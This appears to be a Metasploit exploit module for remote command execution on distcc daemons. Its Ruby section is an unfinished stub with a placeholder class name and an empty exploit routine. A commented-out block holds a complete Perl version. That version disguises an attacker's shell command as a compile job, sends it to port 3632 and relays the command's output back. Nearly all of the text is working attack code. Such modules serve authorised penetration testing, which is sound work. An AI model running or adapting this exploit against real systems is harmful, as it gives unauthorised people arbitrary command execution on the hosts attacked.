require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'DistCC Daemon Command Execution',
			'Description'    => %q{
				This module uses a documented security weakness to execute
				arbitrary commands on any system running distccd.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'MIL', '19'],
					[ 'URL', 'http://distcc.samba.org/security.html'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::distcc_exec;
use base "Msf::Exploit";
use Pex::Text;
use strict;

my $advanced = { };

my $info =
  {
	'Name'  => 'DistCC Daemon Command Execution',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>'],

	'Arch'  => [ ],
	'OS'    => [ ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The distccd server port', 3632],
	  },
	  
	'Payload' =>
	  {
		'Space'    => 1024,
		'Keys'     => ['cmd', 'cmd_bash'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This module uses a documented security weakness to execute
        arbitrary commands on any system running distccd. 
}),

	'Refs'  =>
	  [
		['MIL', '19'],
		['URL', 'http://distcc.samba.org/security.html'],
	  ],

	'Keys'  =>  ['distcc'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
	my ($res, $len);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $distcmd = $self->DistCommand("sh", "-c", $shellcode);
	$s->Send($distcmd);

	my $app = "DOTI0000000A"."METASPLOIT\n";
	$s->Send($app);

	$res = $s->Recv(24, 5);
	if (! $res || length($res) != 24) {
		$self->PrintLine("[*] The remote distccd did not reply to our request");
		return;
	}

	# Check STDERR
	$res = $s->Recv(4, 5);
	$res = $s->Recv(8, 5);
	$len = unpack('N', pack('H*', $res));
	if ($len) {
		$res = $s->Recv($len, 5);
		foreach (split(/\n/, $res)) {
			$self->PrintLine("stderr: $_");
		}
	}

	# Check STDOUT
	$res = $s->Recv(4, 5);
	$res = $s->Recv(8, 5);
	$len = unpack('N', pack('H*', $res));
	if ($len) {
		$res = $s->Recv($len, 5);
		foreach (split(/\n/, $res)) {
			$self->PrintLine("stdout: $_");
		}
	}
}

sub DistCommand {
	my $self = shift;

	# convince distcc that this is a compile
	push @_, "#";
	push @_, "-c";
	push @_, "main.c";
	push @_, "-o";
	push @_, "main.o";

	# set distcc 'magic fairy dust' and argument count
	my $res = "DIST00000001".sprintf("ARGC%.8x", scalar(@_));

	# set the arguments
	foreach (@_) {
		$res .= sprintf("ARGV%.8x%s", length($_), $_);
	}

	return $res;
}

1;

=end


end
end	
